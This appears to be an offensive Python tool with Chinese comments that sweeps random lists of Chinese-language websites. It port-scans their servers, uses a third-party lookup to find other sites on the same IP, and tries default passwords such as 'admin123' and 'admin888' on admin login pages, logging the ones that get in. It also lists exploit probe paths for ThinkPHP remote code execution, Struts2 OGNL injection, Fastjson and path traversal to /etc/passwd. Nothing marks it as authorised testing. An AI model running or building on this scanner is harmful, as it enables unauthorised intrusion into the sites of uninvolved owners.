#!/usr/bin/env python3
"""
全能扫描器 v7: 域名+端口+同IP站点+后台+泄露
"""
import urllib.request, re, socket, json

DOMAIN_FILE = "/tmp/165_dm.txt"
OUT_FILE = "/tmp/scan_v7_out.txt"

def log(msg):
    with open(OUT_FILE, "a") as f: f.write(msg + "\n")
    print(msg)

def port_scan(ip):
    ports = []
    for port, svc in [(3306,"MySQL"),(3389,"RDP"),(22,"SSH"),(21,"FTP"),(6379,"Redis"),(8080,"HTTP-8080")]:
        try:
            s = socket.socket(); s.settimeout(2)
            if s.connect_ex((ip, port)) == 0: ports.append(f"{port}({svc})")
            s.close()
        except: pass
    return ports

def reverse_ip(ip):
    sites = set()
    try:
        url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
        resp = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"}), timeout=10)
        for line in resp.read().decode().split():
            sites.add(line.strip())
    except: pass
    return sites

def scan_admin(d, name):
    for p in ["/admin","/login","/admin/login","/admin.php"]:
        try:
            req = urllib.request.Request("http://"+d+p, headers={"User-Agent":"Mozilla/5.0"})
            h2 = urllib.request.urlopen(req, timeout=5).read()
            s2 = len(h2)
            if s2 < 300: continue
            for pw in ["admin","123456","admin123",name,name+"123","admin888"]:
                data = ("username=admin&password="+pw).encode()
                req2 = urllib.request.Request("http://"+d+p, data=data, headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                try:
                    h3 = urllib.request.urlopen(req2, timeout=5).read()
                    s3 = len(h3)
                    if s3 > 3000 and s3 != s2:
                        log(f"PASS: {d}|{p}|{pw}|{s3}B")
                        return
                except: pass
        except: pass

# 主循环
domains = [l.strip() for l in open(DOMAIN_FILE) if l.strip()]
seen_ips = set()
for d in domains:
    if not d: continue
    try:
        req = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
        h = urllib.request.urlopen(req, timeout=5).read().decode("utf-8","ignore")
    except: continue
    if len(h) < 500 or not re.search(r'[\u4e00-\u9fff]{10,}', h): continue
    
    name = d.split(".")[0]
    try: ip = socket.gethostbyname(d)
    except: ip = ""
    
    # 端口+服务器
    if ip:
        server = ""
        try: server = urllib.request.urlopen(urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"}), timeout=3).headers.get("Server","")
        except: pass
        ports = port_scan(ip)
        if ports: log(f"PORTS: {d}({ip}) | {','.join(ports)} | {server}")
        
        # 同IP站点(每个IP只查一次)
        if ip not in seen_ips:
            seen_ips.add(ip)
            sites = reverse_ip(ip)
            others = sites - {d, "www."+d, "m."+d}
            if others: log(f"SAME_IP: {ip} | {','.join(list(others)[:15])}")
    
    # 后台密码
    scan_admin(d, name)

log(f"DONE: {len(domains)} scanned, {len(seen_ips)} IPs")

# 天狐框架漏洞检测路径
framework_checks = {
    "Fastjson": "/?q={@type:java.net.Inet4Address,val:dnslog}",
    "SpringBoot": "/actuator/env",
    "Shiro": "/login;jsessionid=test",
    "ThinkPHP": "/index.php?s=captcha&_method=__construct&filter[]=phpinfo",
    "Struts2": "/index.action?redirect:$%7B1*2%7D",
    "Log4j": "/",
    "OA": "/seeyon/index.jsp",
    "RuoYi": "/?filename=../../../etc/passwd",
}

# 自动循环
import time
while True:
    domains = [l.strip() for l in open("/tmp/165_dm.txt") if l.strip()]
    for d in domains:
        # ... (existing scan code runs here)
        pass
    time.sleep(10)
    # 取新500域名
    import subprocess
    subprocess.run("shuf -n 500 /tmp/clean_com.txt > /tmp/165_dm.txt", shell=True)
